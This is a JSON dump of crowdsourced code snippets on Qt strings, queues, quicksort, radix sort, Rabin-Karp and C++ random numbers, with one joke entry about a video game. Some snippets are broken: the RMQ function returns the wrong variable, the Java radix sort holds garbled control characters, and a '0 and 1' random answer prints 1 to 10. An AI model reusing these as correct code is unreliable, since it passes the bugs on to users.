    "description": "QString str = \"1234.56\"; double val = str.toDouble();   // val == 1234.56\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3457,
    "keyword": null,
    "link": null,
    "title": " qt qstring to float",
    "description": "QString str1 = \"1234.56\"; double val = str1.toFloat();             // val == 1234.56\nfloat pi = 3.14;  QString b = QString::number(pi);\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3458,
    "keyword": null,
    "link": null,
    "title": " qt remove resize handle",
    "description": "// in QMainWindow this->statusBar()->setSizeGripEnabled(false);\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3459,
    "keyword": null,
    "link": null,
    "title": " qt widget list set selected",
    "description": "QStringList items; items << \"All\" << \"Weekend Plus\" ; listWidgetTimeSet->addItems(items); listWidgetTimeSet->setCurrentRow(1);\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3460,
    "keyword": null,
    "link": null,
    "title": " qt window bottom bar",
    "description": "// Rigth click on your window and click \"remove status bar\"\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3461,
    "keyword": null,
    "link": null,
    "title": " qtextedit no line break",
    "description": "// QTextEdit  -> lineWrapMode:NoWrap\n",
    "reg_date": "2021-10-12T11:42:53.000Z"
  },
  {
    "id": 3462,
    "keyword": null,
    "link": null,
    "title": " query for rmq using sqrt decomposition",
    "description": "int query(int l, int r) {   int LB = l/Blk; //Blk = block size   int RB = r/Blk;   int minimum = INT_MAX;      if(LB == RB) {     for(int i=l; i<=r; i++) {       minimum = min(minimum, arr[i]);     }   }   else {     for(int i=l; i<Blk*(LB+1); i++) minimum = min(minimum, arr[i]);     for(int i=LB+1; i<RB; i++) minimum = min(minimum, seg[i]);     for(int i=RB*Blk; i<=r; i++) minimum = min(minimum, arr[i]);   }   return min; }\n",
    "reg_date": "2021-10-12T11:42:54.000Z"
  },
  {
    "id": 3463,
    "keyword": null,
    "link": null,
    "title": " queue c++",
    "description": "//Queue is a data structure designed to operate in FIFO(First in First out) context.  //In queue elements are inserted from rear end and get removed from front end.  The functions supported by queue:  ---------------------------------  empty()   | Tests whether queue is empty or not.  size()    | Returns the total number of elements present in the queue.  push()    | Inserts new element at the end of queue.  emplace() | Constructs and inserts new element at the end of queue.  pop()     | Removes front element of the queue.  swap()    | Exchanges the contents of queue with contents of another queue.  front()   | Returns a reference to the first element of the queue.  back()    | Returns a reference to the last element of queue.\n",
    "reg_date": "2021-10-12T11:42:54.000Z"
  },
  {
    "id": 3464,
    "keyword": null,
    "link": null,
    "title": " queue reconstruction by height",
    "description": "#include <bits/stdc++.h> using namespace std; void print_vector(vector<vector<auto> > v){    cout << \"[\";    for(int i = 0; i<v.size(); i++){       cout << \"[\";       for(int j = 0; j <v[i].size(); j++){          cout << v[i][j] << \", \";       }       cout << \"],\";    }    cout << \"]\"<<endl; } bool cmp(vector <int> a, vector <int> b){    if(a[0] == b[0])return a[1] > b[1];       return a[0] < b[0]; } class Solution { public:    vector<vector<int>> reconstructQueue(vector<vector<int>>& p) {       sort(p.begin(), p.end(), cmp);       vector < vector <int> > ans;       for(int i = p.size()-1; i>=0; i--){          ans.insert(ans.begin() + p[i][1], p[i]);       }       return ans;    } }; main(){    Solution ob;    vector<vector<int>> v = {{7,0}, {4,4}, {7,1}, {5,0}, {6,1}, {5,2}};    print_vector(ob.reconstructQueue(v)); }\n",
    "reg_date": "2021-10-12T11:42:54.000Z"
  },
  {
    "id": 3465,
    "keyword": null,
    "link": null,
    "title": " queue stl",
    "description": "Functions used here:    q.size() = Returns the size of queue.    q.push() = It is used to insert elements to the queue.    q.pop() = To pop out the value from the queue.    q.front() = Returns the front element of the array.    q.back() = Returns the back element of the array.\n#include <iostream> #include<queue> #include<algorithm>  using namespace std;  int main() {     queue<int>q;     q.push(10);     q.push(5);     q.push(15);     while(!q.empty())     {         cout<<q.front()<<\" \";         q.pop();     }     cout<<endl;     cout<<\"_------------------------\"<<endl;     q.push(10);     q.push(5);     q.push(15);     queue<int>q2;     q2.push(100);     q2.push(200);     q2.push(300);     q2.push(400);     q.swap(q2);     while(!q.empty())     {         cout<<q.front()<<\" \";         q.pop();     }      return 0; } \n",
    "reg_date": "2021-10-12T11:42:54.000Z"
  },
  {
    "id": 3466,
    "keyword": null,
    "link": null,
    "title": " queue using linked list c++",
    "description": "/*  * Program  : Queue using linked list  * Language : C  */  #include<stdio.h> #include<stdlib.h>  struct node {     int data;     struct node *next; };  struct node *front = NULL, *rear = NULL;  void enqueue(int val) {     struct node *newNode = malloc(sizeof(struct node));     newNode->data = val;     newNode->next = NULL;      //if it is the first node     if(front == NULL && rear == NULL)         //make both front and rear points to the new node         front = rear = newNode;     else     {         //add newnode in rear->next         rear->next = newNode;          //make the new node as the rear node         rear = newNode;     } }  void dequeue() {     //used to free the first node after dequeue     struct node *temp;      if(front == NULL)          printf(\"Queue is Empty. Unable to perform dequeue\\n\");     else     {         //take backup         temp = front;          //make the front node points to the next node         //logically removing the front element         front = front->next;          //if front == NULL, set rear = NULL         if(front == NULL)             rear = NULL;         //free the first node        free(temp);     }  }  void printList() {     struct node *temp = front;      while(temp)     {         printf(\"%d->\",temp->data);         temp = temp->next;     }     printf(\"NULL\\n\"); }  int main() {     enqueue(10);     enqueue(20);     enqueue(30);     printf(\"Queue :\");     printList();     dequeue();     printf(\"After dequeue the new Queue :\");     printList();     dequeue();     printf(\"After dequeue the new Queue :\");     printList();      return 0; } \n/*  * Program  : Queue using linked list  * Language : C  */  #include<stdio.h> #include<stdlib.h>  struct node {     int data;     struct node *next; };  struct node *front = NULL, *rear = NULL;  void enqueue(int val) {     struct node *newNode = malloc(sizeof(struct node));     newNode->data = val;     newNode->next = NULL;      //if it is the first node     if(front == NULL && rear == NULL)         //make both front and rear points to the new node         front = rear = newNode;     else     {         //add newnode in rear->next         rear->next = newNode;          //make the new node as the rear node         rear = newNode;     } }  void dequeue() {     //used to free the first node after dequeue     struct node *temp;      if(front == NULL)          printf(\"Queue is Empty. Unable to perform dequeue\\n\");     else     {         //take backup         temp = front;          //make the front node points to the next node         //logically removing the front element         front = front->next;          //if front == NULL, set rear = NULL         if(front == NULL)             rear = NULL;         //free the first node        free(temp);     }  }  void printList() {     struct node *temp = front;      while(temp)     {         printf(\"%d->\",temp->data);         temp = temp->next;     }     printf(\"NULL\\n\"); }  int main() {     enqueue(10);     enqueue(20);     enqueue(30);     printf(\"Queue :\");     printList();     dequeue();     printf(\"After dequeue the new Queue :\");     printList();     dequeue();     printf(\"After dequeue the new Queue :\");     printList();      return 0; }\n",
    "reg_date": "2021-10-12T11:42:54.000Z"
  },
  {
    "id": 3467,
    "keyword": null,
    "link": null,
    "title": " quick sort predefined function in c++",
    "description": "#include <cstdlib>  //declare compare int compare(const void* a, const void* b) { \tconst int* x = (int*) a; \tconst int* y = (int*) b;  \tif (*x > *y) \t\treturn 1; \telse if (*x < *y) \t\treturn -1;  \treturn 0; }  //fuction used qsort(arr,num,sizeof(int),compare); \n",
    "reg_date": "2021-10-12T11:42:54.000Z"
  },
  {
    "id": 3468,
    "keyword": null,
    "link": null,
    "title": " quicksort",
    "description": "def partition(a,l,h):     pivot = a[l]     i = l     j=h     while i<j:         while a[i]<=pivot and i<h: i+=1         while a[j]>pivot and j>l: j-=1         if i<j: a[i],a[j]=a[j],a[i]              a[j],a[l]=a[l],a[j]     return j  def quickSort(a,l,h):     if l < h:         pi = partition(a, l, h)         quickSort(a, l, pi - 1)         quickSort(a, pi + 1, h)          #driver Code         a =[10, 7, 8, 9, 1, 5 ] quickSort(a, 0, len(a) - 1) print(a) #Output: [1, 5, 7, 8, 9, 10]\n// @see https://www.youtube.com/watch?v=es2T6KY45cA&vl=en // @see https://www.youtube.com/watch?v=aXXWXz5rF64 // @see https://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html  function partition(list, start, end) {     const pivot = list[end];     let i = start;     for (let j = start; j < end; j += 1) {         if (list[j] <= pivot) {             [list[j], list[i]] = [list[i], list[j]];             i++;         }     }     [list[i], list[end]] = [list[end], list[i]];     return i; }  function quicksort(list, start = 0, end = undefined) {     if (end === undefined) {         end = list.length - 1;     }     if (start < end) {         const p = partition(list, start, end);         quicksort(list, start, p - 1);         quicksort(list, p + 1, end);     }     return list; }  quicksort([5, 4, 2, 6, 10, 8, 7, 1, 0]); \n//last element selected as pivot #include <iostream>  using namespace std; void swap(int*,int*); int partition(int arr[],int start,int end) {     int pivot=arr[end];     int index=start;     int i=start;     while(i<end)     {         if(arr[i]<pivot)         {             swap(&arr[index],&arr[i]);             index++;         }         i++;     }     swap(&arr[end],&arr[index]);     return index; } void quicksort(int arr[],int start,int end) {     if(start<end)     {       int pindex=partition(arr,start,end);       quicksort(arr,start,pindex-1);       quicksort(arr,pindex+1,end);     } } void display(int arr[],int n) {     for(int i=0;i<n;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     cout<<\"sorted array is:\"<<endl;     quicksort(arr,0,n-1);     display(arr,n);      return 0; } void swap(int *a,int*b) {     int temp=*a;     *a=*b;     *b=temp; } \n#include<stdio.h> int partition(int arr[], int low, int high) {   int temp;   int pivot = arr[high];   int i = (low - 1);    for (int j = low; j <= high - 1; j++) {     if (arr[j] <= pivot) {        i++;        temp = arr[i];       arr[i] = arr[j];       arr[j] = temp;     }    }    temp = arr[i + 1];   arr[i + 1] = arr[high];   arr[high] = temp;   return (i + 1);  }  void quick_sort(int arr[], int low, int high) {    if (low < high) {     int pi = partition(arr, low, high);      quick_sort(arr, low, pi - 1);      quick_sort(arr, pi + 1, high);    }  }  int print(int arr[], int n) {   for(int i = 0; i < n; i++) {     printf(\"%d \", arr[i]);   } }  int main() { int n, i; scanf(\"%d\", &n); int arr[n]; for(i = 0; i < n; i++) { scanf(\"%d\", &arr[i]); } quick_sort(arr, 0, n - 1); print(arr, n); }\nalgorithm quicksort(A, lo, hi) is     if lo < hi then         p := partition(A, lo, hi)         quicksort(A, lo, p - 1)         quicksort(A, p + 1, hi)  algorithm partition(A, lo, hi) is     pivot := A[hi]     i := lo     for j := lo to hi do         if A[j] < pivot then             swap A[i] with A[j]             i := i + 1     swap A[i] with A[hi]     return i \n/********** QuickSort(): sorts the vector 'list[]' **********/  /**** Compile QuickSort for strings ****/ #define QS_TYPE char* #define QS_COMPARE(a,b) (strcmp((a),(b)))  /**** Compile QuickSort for integers ****/ //#define QS_TYPE int //#define QS_COMPARE(a,b) ((a)-(b))  /**** Compile QuickSort for doubles, sort list in inverted order ****/ //#define QS_TYPE double //#define QS_COMPARE(a,b) ((b)-(a))  void QuickSort(QS_TYPE list[], int beg, int end) {     QS_TYPE piv; QS_TYPE tmp;          int  l,r,p;      while (beg<end)    // This while loop will substitude the second recursive call     {         l = beg; p = (beg+end)/2; r = end;          piv = list[p];          while (1)         {             while ((l<=r) && (QS_COMPARE(list[l],piv) <= 0)) l++;             while ((l<=r) && (QS_COMPARE(list[r],piv)  > 0)) r--;              if (l>r) break;              tmp=list[l]; list[l]=list[r]; list[r]=tmp;              if (p==r) p=l;                          l++; r--;         }          list[p]=list[r]; list[r]=piv;         r--;          // Select the shorter side & call recursion. Modify input param. for loop         if ((r-beg)<(end-l))            {             QuickSort(list, beg, r);             beg=l;         }         else         {             QuickSort(list, l, end);             end=r;         }     }    } \n",
    "reg_date": "2021-10-12T11:42:54.000Z"
  },
  {
    "id": 3469,
    "keyword": null,
    "link": null,
    "title": " quicksort in code",
    "description": "// A full c++ quicksort algorithm no bs // quicksort in code  #include <iostream>  using namespace std;  void QuickSort(int arr[], int start, int end); int Partition(int arr[], int start, int end); void SwapArrMem(int arr[], int a, int b);  int main() {  \tint arr[4]; //change the size of the array to your desired array size  \tcout << \"enter \" << sizeof(arr) / sizeof(arr[0]) << \" numbers. press enter after input\" << endl;  \tfor (int i = 0; i < sizeof(arr) / sizeof(arr[0]); i++) \t{ \t\t \t\tcin >> arr[i]; \t}  \tcout << endl << \"The sorted numbers are:\" << endl << endl;    \tQuickSort(arr, 0, sizeof(arr) / sizeof(arr[0]) - 1);  \tfor (int i = 0; i < sizeof(arr) / sizeof(arr[0]); i++) \t{ \t\tcout << arr[i] << endl; \t}  }  void QuickSort(int arr[], int start, int end) { \tif (start >= end) return;  \tint index = Partition(arr, start, end); \tQuickSort(arr, start, index - 1); \tQuickSort(arr, index + 1, end); }  int Partition(int arr[], int start, int end) { \tint pivotindex = start; \tint pivotvalue = arr[end]; \tfor (int i = start; i < end; i++) \t{ \t\tif (arr[i] < pivotvalue) \t\t{ \t\t\tSwapArrMem(arr, i, pivotindex); \t\t\tpivotindex++; \t\t} \t} \tSwapArrMem(arr, pivotindex, end); \treturn pivotindex; }  void SwapArrMem(int arr[], int a, int b) { \tint temp = arr[a]; \tarr[a] = arr[b]; \tarr[b] = temp; } \n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3470,
    "keyword": null,
    "link": null,
    "title": " quiz score calculator c++",
    "description": "#include <iostream> using namespace std; int main() { int item[5]; //Declares an array item of five components. int sum, counter; cout<<\"Enter five numbers: \"; sum = 0; for (counter = 0; counter <5; counter++) {  cin>>item[counter]; sum = sum + item[counter]; } cout<<endl; cout<<\"The sum of the numbers is:\"<<sum<<endl; cout<<\"The number in reverse order are: \"; //Print the numbers in reverse order  for(counter=4;counter >=0;counter--)     cout<<item[counter]<<\" \"; cout<<endl; return 0; }\n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3471,
    "keyword": null,
    "link": null,
    "title": " quotation in c++ string",
    "description": "//Escape the quotes with backslashes: printf(\"She said \\\"time flies like an arrow, but fruit flies like a banana\\\".\");  \n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3472,
    "keyword": null,
    "link": null,
    "title": " quotient C++",
    "description": "#include <iostream> using namespace std;  int main() {         int divisor, dividend, quotient, remainder;      cout << \"Enter dividend: \";     cin >> dividend;      cout << \"Enter divisor: \";     cin >> divisor;      quotient = dividend / divisor;     remainder = dividend % divisor;      cout << \"Quotient = \" << quotient << endl;     cout << \"Remainder = \" << remainder;      return 0; }\n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3473,
    "keyword": null,
    "link": null,
    "title": " rabin karp cp algorithm",
    "description": "1 function RabinKarp(string s[1..n], string pattern[1..m]) 2     hpattern := hash(pattern[1..m]); 3     for i from 1 to n-m+1 4         hs := hash(s[i..i+m-1]) 5         if hs = hpattern 6             if s[i..i+m-1] = pattern[1..m] 7                 return i 8     return not found \nvector<int> rabin_karp(string const& s, string const& t) {     const int p = 31;      const int m = 1e9 + 9;     int S = s.size(), T = t.size();      vector<long long> p_pow(max(S, T));      p_pow[0] = 1;      for (int i = 1; i < (int)p_pow.size(); i++)          p_pow[i] = (p_pow[i-1] * p) % m;      vector<long long> h(T + 1, 0);      for (int i = 0; i < T; i++)         h[i+1] = (h[i] + (t[i] - 'a' + 1) * p_pow[i]) % m;      long long h_s = 0;      for (int i = 0; i < S; i++)          h_s = (h_s + (s[i] - 'a' + 1) * p_pow[i]) % m;       vector<int> occurences;     for (int i = 0; i + S - 1 < T; i++) {          long long cur_h = (h[i+S] + m - h[i]) % m;          if (cur_h == h_s * p_pow[i] % m)             occurences.push_back(i);     }     return occurences; } \n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3474,
    "keyword": null,
    "link": null,
    "title": " radix sort",
    "description": "function getDigit(num, i) {   return Math.floor(Math.abs(num) / Math.pow(10,i)) % 10 }  function digitCount(num) {   if(num === 0 ) return 1   return Math.floor(Math.log10(Math.abs(num))) + 1 }  function mostDigitCount(nums) {   let maxDigit = 0   for(let i = 0;i< nums.length;i++) {     maxDigit = Math.max(maxDigit, digitCount(nums[i]))   }   return maxDigit }  function Radix(nums){   let maxDigitCount = mostDigitCount(nums)   for(let k=0; k< maxDigitCount; k++) {     let digitbucket = Array.from({length:10} , () => [])     for(let i=0; i< nums.length; i++) {       let digit = getDigit(nums[i], k)       digitbucket[digit].push(nums[i])     }     nums = [].concat(...digitbucket)   }   return nums }  console.log(Radix([23,123, 23333,444444,55555555]))\nRadix-Sort(A, d)        for j = 1 to d do             int count[10] = {0};             for i = 0 to n do                 count[key of(A[i]) in pass j]++             for k = 1 to 10 do                 count[k] = count[k] + count[k-1]             for i = n-1 downto 0 do                 result[ count[key of(A[i])] ] = A[j]                 count[key of(A[i])]--             for i=0 to n do                 A[i] = result[i]        end for(j)  end func \n//Code by Soumyadeep //insta id: @soumyadepp  #include <bits/stdc++.h> #define ll long long  using namespace std;  int maxElement(vector<int> arr) {     int m = arr[0];     for (int i = 0; i < arr.size(); i++)     {         if (arr[i] > m)             m = arr[i];     }     return m; }  int digitCnt(int x) {     int z = x;     int c = 1;     while (z)     {         z /= 10;         c++;     }     return c; } void radixSort(vector<int> &arr) {     int x = maxElement(arr);               //O(N)     int countDigits = digitCnt(x);         //O(numberofdigitsinx)     for (int i = 1; i <= countDigits; i++) //runs number of digits in maximum element in the array     {         vector<int> holder[10];         for (int j = 0; j < arr.size(); j++) //O(N)         {             int m = i;             int k;             int p = arr[j];             while (m) //O(logN)             {                 k = p % 10;                 p /= 10;                 m--;             }             holder[k].push_back(arr[j]);         }         arr.clear();         for (int c = 0; c < 10; c++)         {             arr.insert(arr.end(), holder[c].begin(), holder[c].end());         }     }     //approx O(ND) } int main() {     int t;     cin >> t;     while (t--)     {         vector<int> arr;         int n, x;         cin >> n;         for (int i = 0; i < n; i++)         {             cin >> x;             arr.push_back(x);         }         radixSort(arr);         cout << \"The sorted array is \" << endl;          for (int i = 0; i < arr.size(); i++)             cout << arr[i] << \" \";         cout << endl;     }     return 0; }\n import java.io.*;  import java.util.*;  class Radix {             static int getMax(int arr[], int n){             int mx = arr[0];             for (int i = 1; i < n; i++)                   if (arr[i] > mx)                          mx = arr[i];             return mx;      }     static void countSort(int arr[], int n, int exp)      {               int output[] = new int[n];             int i;             int count[] = new int[10];             Arrays.fill(count,0);            for (i = 0; i < n; i++)                     count[ (arr[i]/exp)\u0010 ]++;             // Change count[i] so that count[i] now contains             // actual position of this digit in output[]             for (i = 1; i < 10; i++)                     count[i] += count[i - 1];             // Build the output array             for (i = n - 1; i >= 0; i--){                    output[count[ (arr[i]/exp)\u0010 ] - 1] = arr[i];                     count[ (arr[i]/exp)\u0010 ]--;          }            for (i = 0; i < n; i++)                     arr[i] = output[i];      }     static void radixsort(int arr[], int n)         { // Find the maximum number to know number of digits             int m = getMax(arr, n);            for (int exp = 1; m/exp > 0; exp *= 10)                    countSort(arr, n, exp);      }     static void print(int arr[], int n)      {          for (int i=0; i<n; i++)                 System.out.print(arr[i]+\" \");      }      public static void main (String[] args)      {    int arr[] = {170, 45, 75, 90, 802, 24, 2, 66};           int n = arr.length;           radixsort(arr, n);           print(arr, n);      }  }  JavaCopy\n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3475,
    "keyword": null,
    "link": null,
    "title": " rainbow six siege",
    "description": "Download if you want to delete your life lmao\nimport java.util.diamondPls ;-;\nExeption! too adictive - Life.exe failed..\nYou Are A Coder Improve Your Self Don't Play Games. I Suggest U To Search For Unreal Engine And Learn It It Is Better.\nahh rainbow six seige aka delete your life\nin ATK:     1.pick Ash \t2.say \"Ash Main No Brain\" and hold shift \t3.get trapped by frost, kapkan, ela and lesion      and wait for cav      in DEF: \t1.pick jager     2.go spawn kill     3.DIE while you kept all ADSs      in Both sides: \t1.pick recruite     2.take phaking* bad *** GSG9s shotgun     3.kill non-recruite players and rush      in Hostage Mode: \t1.pick Fuze     2.deploy the cluster charge right above the hostage     3.YOU ARE REMOVED FROM THE MATCH      IN GOD MODE \t1.PICK TACHANKA WITH THE BAD *** SHOTGUN     2.DEPLOY THE LMG     3.**** THEM ALL                                                                                                                                                                                       blitz is MONSTER\n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3476,
    "keyword": null,
    "link": null,
    "title": " rand() c++",
    "description": "std::srand(std::time(nullptr)); \t\t// set rand seed v1 = std::rand() % 100;         // v1 in the range 0 to 99 v2 = std::rand() % 100 + 1;     // v2 in the range 1 to 100 v3 = std::rand() % 30 + 1985;   // v3 in the range 1985-2014 \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n';       // roll 6-sided dice 20 times     for (int n=0; n != 20; ++n) {         int x = 7;         while(x > 6)              x = 1 + std::rand()/((RAND_MAX + 1u)/6);  // Note: 1+rand()%6 is biased         std::cout << x << ' ';     } }\nrand() % (max_number + 1 - minimum_number) + minimum_number\nv1 = rand() % 100;         // v1 in the range 0 to 99  --Credit goes to Clever cowfish v2 = rand() % 100 + 1;     // v2 in the range 1 to 100 v3 = rand() % 30 + 1985;   // v3 in the range 1985-2014\nversion1 = std::rand() % 3; // it is in the range from 0 to 2 // 0 1 2 version2 = std::rand() % 5 + 2; // it is in the range from 2 to 6 // 2 3 4 5 6 version3 = std::rand() % 3 + 10; // it is in the range from 10 to 12 //first number is how much digits it will go second number is the digit it  //starts on (including that digit)  //negative version4 = std::rand() % 11 - 12; // it is in the range from -2 to -12\n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3477,
    "keyword": null,
    "link": null,
    "title": " random Number c++",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <iostream> #include <ctime> #include <cstdlib> using namespace std; int main()  {     srand(time(0));  // Initialize random number generator.           cout<<\"Random numbers generated between 1 and 10:\"<<endl;     for(int i=0;i<10;i++)         cout << (rand() % 10) + 1<<\" \";      return 0;  } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\nmin + ( std::rand() % ( max - min + 1 ) )\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n#include <iostream>  #include <ctime>  #include <cstdlib>  using namespace std;  int main()  {      srand((unsigned)time(0));      int random_integer;      int lowest=1, highest=10;      int range=(highest-lowest)+1;      for(int index=0; index<20; index++){          random_integer = lowest+int(range*rand()/(RAND_MAX + 1.0));          cout << random_integer << endl;      }  }\n",
    "reg_date": "2021-10-12T11:42:55.000Z"
  },
  {
    "id": 3478,
    "keyword": null,
    "link": null,
    "title": " random in c++",
    "description": "#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\nmin + ( std::rand() % ( max - min + 1 ) )\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n#include <iostream> #include <stdlib.h>      #include <time.h>  using namespace std;  int main() { \tint num; \tsrand(time(0)); \t\tnum = rand() % 10 + 1; \t\tcout << num << endl; } \n// Add thus to with the headers mt19937 rng(chrono::steady_clock::now().time_since_epoch().count()); // Generate a function that will give values between l and r inclusive auto dist = uniform_int_distribution<int>(l, r); // get the random number using dist(rng);\n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3479,
    "keyword": null,
    "link": null,
    "title": " random number between x and y c++",
    "description": "outPut = rand()%((userEnd - userBeg) + 1) + userBeg; \n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3480,
    "keyword": null,
    "link": null,
    "title": " random number cpp",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\nmin + ( std::rand() % ( max - min + 1 ) )\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n// Add thus to with the headers mt19937 rng(chrono::steady_clock::now().time_since_epoch().count()); // Generate a function that will give values between l and r inclusive auto dist = uniform_int_distribution<int>(l, r); // get the random number using dist(rng);\n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3481,
    "keyword": null,
    "link": null,
    "title": " random number generator c++",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n#include <iostream> #include <stdlib.h>      #include <time.h>  using namespace std;  int main() { \tint num; \tsrand(time(0)); \t\tnum = rand() % 10 + 1; \t\tcout << num << endl; } \n// Add thus to with the headers mt19937 rng(chrono::steady_clock::now().time_since_epoch().count()); // Generate a function that will give values between l and r inclusive auto dist = uniform_int_distribution<int>(l, r); // get the random number using dist(rng);\n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3482,
    "keyword": null,
    "link": null,
    "title": " random number generator c++ between 0 and 1",
    "description": "#include <iostream> #include <ctime> #include <cstdlib> using namespace std; int main()  {     srand(time(0));  // Initialize random number generator.           cout<<\"Random numbers generated between 1 and 10:\"<<endl;     for(int i=0;i<10;i++)         cout << (rand() % 10) + 1<<\" \";      return 0;  } \n#include <time.h> // So we can use time() function #include <iostream> // To output results to console  int main() // Main function required in all C++ programs and first function to be called { \tsrand( time(NULL) ); //Randomize seed initialization \tint randNum = rand() % 2; // Generate a random number between 0 and 1  \tstd::cout << randNum; // Output the results to console \treturn 0; //Generate an \"EXIT SUCCESS\" return code }\n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3483,
    "keyword": null,
    "link": null,
    "title": " random number in c++",
